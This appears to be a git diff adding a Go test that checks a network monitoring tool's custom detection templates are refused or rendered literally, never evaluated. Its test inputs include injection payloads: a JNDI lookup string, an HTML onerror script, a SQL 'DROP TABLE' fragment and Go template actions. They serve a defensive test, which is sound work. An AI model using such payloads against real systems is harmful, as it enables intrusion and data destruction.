@@ -7,6 +7,10 @@ import (
 	"os/exec"
 	"strings"
 	"testing"
+	"time"
+
+	"github.com/tomlawesome/mikroview/internal/engine"
+	"github.com/tomlawesome/mikroview/internal/store"
 )
 
 // The injection audit (docs/decisions/injection-audit.md) concluded that
@@ -175,6 +179,87 @@ func TestNoHTMLInjectionSinksInTheFrontend(t *testing.T) {
 					"Render untrusted values as text; if this is genuinely necessary, "+
 					"it needs an entry in docs/decisions/injection-audit.md first.", rel, bad)
 			}
+		}
+	}
+}
+
+// A custom detection's detail template is the one place in this codebase
+// where an operator supplies text that is later rendered into the
+// interface (issue #502), so it belongs in this file's remit rather than
+// only in a rendering unit test.
+//
+// The structural defence is that there is no template engine to reach:
+// `"text/template"` is a forbidden sink above, and RenderEmission
+// substitutes a fixed, known set of names by hand. What this test pins
+// is the consequence -- operator text is data. A template that names
+// anything outside the closed placeholder set is refused before it is
+// stored, and everything else survives to the rendered Detail exactly as
+// it was written, with no evaluation of any kind.
+func TestCustomDetectionDetailTemplateIsDataNotCode(t *testing.T) {
+	build := func(t *testing.T, tmpl string) (*engine.DeclarativeDefinition, error) {
+		t.Helper()
+		d := engine.NewDefinition("operator input", engine.IntentDetection, engine.KindDeclarative)
+		d.Enabled = true
+		d.Provenance = engine.Provenance{Origin: engine.ProvenanceCustom}
+		d.ParamSchema = engine.CustomDetectionParamSchema()
+		d.Params = engine.Params{"threshold": 1, "window": "60s"}
+		d.Detection = &engine.DetectionSpec{
+			Conditions:     []engine.Condition{{Field: engine.FieldDestinationPort, Operator: engine.OpEquals, Values: []string{"22"}}},
+			Key:            engine.KeyPerSource,
+			Counting:       engine.CountingTotal,
+			DetailTemplate: tmpl,
+		}
+		return engine.BuildCustomDetectionDefinition(d, nil)
+	}
+
+	// Refused outright: a name outside the closed set. {Ports} is the
+	// interesting one -- it is a real token elsewhere in this engine, so
+	// a check that only rejected nonsense would let it through.
+	for _, tmpl := range []string{
+		"{Count} across {Ports}",
+		"{Count} from {DestinationAddress}",
+		"{Count} {Env}",
+		// A Go template action is caught too, and by accident rather
+		// than by design: `{{end}}` contains `{end}`, which is
+		// placeholder-shaped, so the closed-set check refuses it. Worth
+		// pinning in the safe direction -- if the token syntax ever
+		// changes, this stops silently becoming accepted text.
+		"{{range .}}x{{end}} {Count}",
+	} {
+		if _, err := build(t, tmpl); err == nil {
+			t.Errorf("template %q was accepted; a placeholder outside the closed set must be refused before anything is stored", tmpl)
+		}
+	}
+
+	// Accepted, and rendered literally. None of these is a placeholder
+	// this engine knows, so none of them may be interpreted: the only
+	// substitution that happens is {Count} and the key components.
+	for _, tc := range []struct {
+		tmpl string
+		want string
+	}{
+		{`{{.Anything}} from {SourceAddress}`, `{{.Anything}} from 198.51.100.7`},
+		{`${jndi:ldap://example.invalid/a} {Count}`, `${jndi:ldap://example.invalid/a} 1`},
+		{`{Count} <img src=x onerror=alert(1)>`, `1 <img src=x onerror=alert(1)>`},
+		{`{Count} '); DROP TABLE flags; --`, `1 '); DROP TABLE flags; --`},
+	} {
+		dd, err := build(t, tc.tmpl)
+		if err != nil {
+			t.Errorf("template %q was refused (%v); it names no placeholder outside the closed set, so it is ordinary text", tc.tmpl, err)
+			continue
+		}
+		var got string
+		dd.OnRoutedEmission = func(r engine.RoutedEmission) {
+			if r.Detection != nil {
+				got = r.Detection.Detail
+			}
+		}
+		dd.Evaluate(store.Event{
+			SrcIP: "198.51.100.7", DstIP: "10.0.0.1", DstPort: 22,
+			ReceivedAt: time.Now(), Action: store.ActionDrop, ConnState: "new",
+		})
+		if got != tc.want {
+			t.Errorf("template %q rendered as %q, want %q -- operator text must survive as data", tc.tmpl, got, tc.want)
 		}
 	}
 }
